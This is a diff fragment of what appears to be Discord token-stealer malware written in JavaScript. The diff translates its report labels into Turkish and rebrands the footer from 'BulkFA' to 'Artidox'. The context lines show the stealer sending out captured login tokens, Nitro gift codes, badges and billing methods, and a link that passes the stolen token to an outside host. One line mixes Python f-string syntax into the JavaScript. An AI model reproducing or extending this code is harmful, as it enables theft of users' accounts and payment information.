@@ -610,7 +610,7 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-                        "name": f"<:cilgin:991704799160582204> Jeton:",
+                        "name": f"<:cilgin:991704799160582204> Token:",
                         "value": f'`{token}` [Kopyalamak için tıkla!](https://superfurrycdn.nl/copy/{token})',
                         "inline": False
                     },
@@ -846,13 +846,13 @@ const nitroBought = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Nitro bought!**',
-            value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
+            name: '**Hediyelik nitro satın alındı!**',
+            value: `**Nitro kodu:**\n\`\`\`diff\n+ ${code}\`\`\``,
             inline: true,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: '**Hesap Bilgileri**',
+            value: `Abonelik: **${nitro}**\nRozetler: **${badges}**\nÖdeme Yöntemi: **${billing}**`,
             inline: true,
           },
           {
@@ -866,7 +866,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'BulkFA',
+          text: 'Artidox',
         },
       },
     ],
